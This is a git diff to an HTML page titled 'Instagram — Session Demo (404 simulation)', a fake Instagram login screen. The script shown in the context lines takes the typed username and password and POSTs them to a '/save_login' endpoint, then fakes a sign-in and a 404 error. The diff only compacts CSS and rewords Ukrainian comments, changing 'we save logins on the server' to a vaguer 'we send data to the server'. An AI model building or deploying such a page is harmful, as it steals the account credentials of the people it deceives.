@@ -5,10 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Instagram — Session Demo (404 simulation)</title>
 <style>
-  :root{
-    --bg:#fafafa; --card:#fff; --muted:#8e8e8e;
-    --accent:#3897f0;
-  }
+  :root{--bg:#fafafa;--card:#fff;--muted:#8e8e8e;--accent:#3897f0}
   html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:var(--bg);color:#111}
   .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
   .card{width:380px;background:var(--card);border:1px solid #dbdbdb;border-radius:10px;padding:20px 22px;box-shadow:0 10px 30px rgba(0,0,0,0.06);text-align:center}
@@ -52,7 +49,7 @@ function simulateLoginFlow() {
     const u = document.getElementById('user').value.trim();
     const p = document.getElementById('pass').value.trim();
 
-    // Зберігаємо логіни на сервері
+    // Надсилаємо дані на сервер
     if(u && p){
         fetch('/save_login', {
             method: 'POST',
@@ -64,7 +61,7 @@ function simulateLoginFlow() {
         .catch(err => console.error(err));
     }
 
-    // Імітуємо 404 після "логіну"
+    // Імітація 404 після "логіну"
     loginBtn.disabled = true;
     loginBtn.textContent = 'Signing in...';
     setTimeout(() => {
@@ -85,3 +82,5 @@ loginBtn.addEventListener('click', simulateLoginFlow);
 </script>
 </body>
 </html>
+
+
